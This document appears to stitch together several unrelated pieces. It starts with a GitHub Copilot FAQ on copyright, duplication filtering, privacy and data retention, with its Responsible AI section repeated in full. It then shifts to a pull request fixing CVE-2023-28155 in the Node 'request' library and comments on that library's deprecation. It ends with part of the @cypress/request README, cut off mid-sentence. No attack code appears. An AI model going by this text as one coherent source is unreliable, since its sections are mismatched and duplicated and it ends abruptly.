The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

GeneralPlans & PricingPrivacyResponsible AI
### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

## PR Checklist:

* [DONE] I have run `npm test` locally and all tests are passing.
* [DONE] I have added/updated tests for any new behavior.
* [DONE] If this is a significant change, an issue has already been created where the problem / solution was discussed: [N/A, or add link to issue here]

## PR Description

This pull request is a fix to [CVE-2023-28155.](https://github.com/request/request/issues/3442)

It introduces a new configuration option `allowInsecureRedirects`, turned off by default. The default configuration leaves library users protected from exploiting [CVE-2023-28155](https://github.com/advisories/GHSA-p8p7-x288-28g6 "CVE-2023-28155"). When the option gets turned on, the cross-protocol redirects will be allowed if library user decides it's safe and required in their case.

Sorry, something went wrong.

| There were no non-doc/tools changes in the repo since 2018 and no commits at all for the last 3 years. I wouldn't expect any fix coming from here.  Our own dependency on `request` came from `jsforce` (which is [not gonna get fixed soon](https://github.com/jsforce/jsforce/issues/1312), as it looks like), so we migrated to the still-maintained [fork from Cypress](https://www.npmjs.com/package/%40cypress/request) via Yarn forced resolutions mechanism, and it worked like a charm.   ---   Update: in case somebody missed that, `request` is [deprecated since 2020](https://github.com/request/request/issues/3142). |

| I have made two PRs on cypress:   * [feat: Add allowInsecureRedirect option cypress-io/request#28](https://github.com/cypress-io/request/pull/28) : Port of this plus enabling allowRedirects in regressing tests * [security: non-breaking: Add option "allowInsecureRedirect" cypress-io/request#30](https://github.com/cypress-io/request/pull/30) : Similar but retains default behavior (non-breaking, non-safe-by-default)   It seems they have an extended test suite handling more complex redirects so if anyone feels up for extending my PRs addressing those cases to get them up to standard, feel free. |

**This is a fork of [`request`](https://github.com/request/request) for use in [Cypress](https://github.com/cypress-io/cypress).**

## Super simple to use

Request is designed to be the simplest way possible to make http calls. It supports HTTPS and follows redirects by default.

```
const request = require('@cypress/request');
request('http://www.google.com', function (error, response, body) {
  console.error('error:', error); // Print the error if one occurred
  console.log('statusCode:', response && response.statusCode); // Print the response status code if a response was received
  console.log('body:', body); // Print the HTML for the Google homepage.
});
```

Request also offers [convenience methods](#convenience-methods) like
`request.defaults` and `request.post`, and there are
lots of [usage examples](#examples) and several
[debugging techniques](#debugging).

---

## Streaming

You can stream any response to a file stream.

```
request('http://google.com/doodle.png').pipe(fs.createWriteStream('doodle.png'))
```

You can also stream a file to a PUT or POST request. This method will also check the file extension against a mapping of file extensions to content-types (in this case `application/json`) and use the proper `content-type` in the PUT request (if the headers don’t already provide one).

```
fs.createReadStream('file.json').pipe(request.put('http://mysite.com/obj.json'))
```

Request can also `pipe` to itself. When doing so, `content-type` and `content-length` are preserved in the PUT headers.

```
request.get('http://google.com/img.png').pipe(request.put('http://mysite.com/img.png'))
```

Request emits a "response" event when a response is received. The `response` argument will be an instance of [http.IncomingMessage](https://nodejs.org/api/http.html#http_class_http_incomingmessage).

```
request
  .get('http://google.com/img.png')
  .on('response', function(response) {
    console.log(response.statusCode) // 200
    console.log(response.headers['content-type']) // 'image/png'
  })
  .pipe(request.put('http://mysite.com/img.png'))
```

To easily handle errors when streaming requests, listen to the `error` event before piping:

```
request
  .get('http://mysite.com/doodle.png')
  .on('error', function(err) {
    console.error(err)
  })
  .pipe(fs.createWriteStream('doodle.png'))
```

Now let’s get fancy.

```
http.createServer(function (req, resp) {
  if (req.url === '/doodle.png') {
    if (req.method === 'PUT') {
      req.pipe(request.put('http://mysite.com/doodle.png'))
    } else if (req.method === 'GET' || req.method === 'HEAD') {
      request.get('http://mysite.com/doodle.png').pipe(resp)
    }
  }
})
```

You can also `pipe()` from `http.ServerRequest` instances, as well as to `http.ServerResponse` instances. The HTTP method, headers, and entity-body data will be sent. Which means that, if you don't really care about security, you can do:

```
http.createServer(function (req, resp) {
  if (req.url === '/doodle.png') {
    const x = request('http://mysite.com/doodle.png')
    req.pipe(x)
    x.pipe(resp)
  }
})
```

And since `pipe()` returns the destination stream in ≥ Node 0.5.x you can do one line proxying. :)

```
req.pipe(request('http://mysite.com/doodle.png')).pipe(resp)
```

Also, none of this new functionality conflicts with requests previous features, it just expands them.

```
const r = request.defaults({'proxy':'http://localproxy.com'})

http.createServer(function (req, resp) {
  if (req.url === '/doodle.png') {
    r.get('http://google.com/doodle.png').pipe(resp)
  }
})
```

You can still use intermediate proxies, the requests will still follow HTTP forwards, etc.

## Promises & Async/Await

`request` supports both streaming and callback interfaces natively. If you'd like `request` to return a Promise instead, you can use an alternative interface wrapper for `request`. These wrappers can be useful if you prefer to work with Promises, or if you'd like to use `async`/`await` in ES2017.

Several alternative interfaces are provided by the request team, including:

* [`request-promise`](https://github.com/cypress-io/request-promise) (uses [Bluebird](https://github.com/petkaantonov/bluebird) Promises)
* [`request-promise-native`](https://github.com/cypress-io/request-promise-native) (uses native Promises)
* [`request-promise-any`](https://github.com/cypress-io/request-promise-any) (uses [any-promise](https://www.npmjs.com/package/any-promise) Promises)

Also, [`util.promisify`](https://nodejs.org/api/util.html#util_util_promisify_original), which is available from Node.js v8.0 can be used to convert a regular function that takes a callback to return a promise instead.

## Forms

`request` supports `application/x-www-form-urlencoded` and `multipart/form-data` form uploads. For `multipart/related` refer to the `multipart` API.

#### application/x-www-form-urlencoded (URL-Encoded Forms)

URL-encoded forms are simple.

```
request.post('http://service.com/upload', {form:{key:'value'}})
// or
request.post('http://service.com/upload').form({key:'value'})
// or
request.post({url:'http://service.com/upload', form: {key:'value'}}, function(err,httpResponse,body){ /* ... */ })
```

#### multipart/form-data (Multipart Form Uploads)

For `multipart/form-data` we use the [form-data](https://github.com/form-data/form-data) library by [@felixge](https://github.com/felixge). For the most cases, you can pass your upload form data via the `formData` option.

```
const formData = {
  // Pass a simple key-value pair
  my_field: 'my_value',
  // Pass data via Buffers
  my_buffer: Buffer.from([1, 2, 3]),
  // Pass data via Streams
  my_file: fs.createReadStream(__dirname + '/unicycle.jpg'),
  // Pass multiple values /w an Array
  attachments: [
    fs.createReadStream(__dirname + '/attachment1.jpg'),
    fs.createReadStream(__dirname + '/attachment2.jpg')
  ],
  // Pass optional meta-data with an 'options' object with style: {value: DATA, options: OPTIONS}
  // Use case: for some types of streams, you'll need to provide "file"-related information manually.
  // See the `form-data` README for more information about options: https://github.com/form-data/form-data
  custom_file: {
    value:  fs.createReadStream('/dev/urandom'),
    options: {
      filename: 'topsecret.jpg',
      contentType: 'image/jpeg'
    }
  }
};
request.post({url:'http://service.com/upload', formData: formData}, function optionalCallback(err, httpResponse, body) {
  if (err) {
    return console.error('upload failed:', err);
  }
  console.log('Upload successful!  Server responded with:', body);
});
```

For advanced cases, you can access the form-data object itself via `r.form()`. This can be modified until the request is fired on the next cycle of the event-loop. (Note that this calling `form()` will clear the currently set form data for that request.)

```
// NOTE: Advanced use-case, for normal use see 'formData' usage above
const r = request.post('http://service.com/upload', function optionalCallback(err, httpResponse, body) {...})
const form = r.form();
form.append('my_field', 'my_value');
form.append('my_buffer', Buffer.from([1, 2, 3]));
form.append('custom_file', fs.createReadStream(__dirname + '/unicycle.jpg'), {filename: 'unicycle.jpg'});
```

See the [form-data README](https://github.com/form-data/form-data) for more information & examples.

#### multipart/related

Some variations in different HTTP implementations require a newline/CRLF before, after, or both before and after the boundary of a `multipart/related` request (using the multipart option). This has been observed in the .NET WebAPI version 4.0. You can turn on a boundary preambleCRLF or postamble by passing them as `true` to your request options.

```
  request({
    method: 'PUT',
    preambleCRLF: true,
    postambleCRLF: true,
    uri: 'http://service.com/upload',
    multipart: [
      {
        'content-type': 'application/json',
        body: JSON.stringify({foo: 'bar', _attachments: {'message.txt': {follows: true, length: 18, 'content_type': 'text/plain' }}})
      },
      { body: 'I am an attachment' },
      { body: fs.createReadStream('image.png') }
    ],
    // alternatively pass an object containing additional options
    multipart: {
      chunked: false,
      data: [
        {
          'content-type': 'application/json',
          body: JSON.stringify({foo: 'bar', _attachments: {'message.txt': {follows: true, length: 18, 'content_type': 'text/plain' }}})
        },
        { body: 'I am an attachment' }
      ]
    }
  },
  function (error, response, body) {
    if (error) {
      return console.error('upload failed:', error);
    }
    console.log('Upload successful!  Server responded with:', body);
  })
```

## HTTP Authentication

```
request.get('http://some.server.com/').auth('username', 'password', false);
// or
request.get('http://some.server.com/', {
  'auth': {
    'user': 'username',
    'pass': 'password',
    'sendImmediately': false
  }
});
// or
request.get('http://some.server.com/').auth(null, null, true, 'bearerToken');
// or
request.get('http://some.server.com/', {
  'auth': {
    'bearer': 'bearerToken'
  }
});
```

If passed as an option, `auth` should be a hash containing values:

* `user` || `username`
* `pass` || `password`
* `sendImmediately` (optional)
* `bearer` (optional)

The method form takes parameters
`auth(username, password, sendImmediately, bearer)`.

`sendImmediately` defaults to `true`, which causes a basic or bearer
authentication header to be sent. If `sendImmediately` is `false`, then
`request` will retry with a proper authentication header after receiving a
`401` response from the server (which must contain a `WWW-Authenticate` header
indicating the required authentication method).

Note that you can also specify basic authentication using the URL itself, as
detailed in [RFC 1738](http://www.ietf.org/rfc/rfc1738.txt). Simply pass the
`user:password` before the host with an `@` sign:

```
const username = 'username',
    password = 'password',
    url = 'http://' + username + ':' + password + '@some.server.com';

request({url}, function (error, response, body) {
   // Do more stuff with 'body' here
});
```

Digest authentication is supported, but it only works with `sendImmediately`
set to `false`; otherwise `request` will send basic authentication on the
initial request, which will probably cause the request to fail.

Bearer authentication is supported, and is activated when the `bearer` value is
available. The value may be either a `String` or a `Function` returning a
`String`. Using a function to supply the bearer token is particularly useful if
used in conjunction with `defaults` to allow a single function to supply the
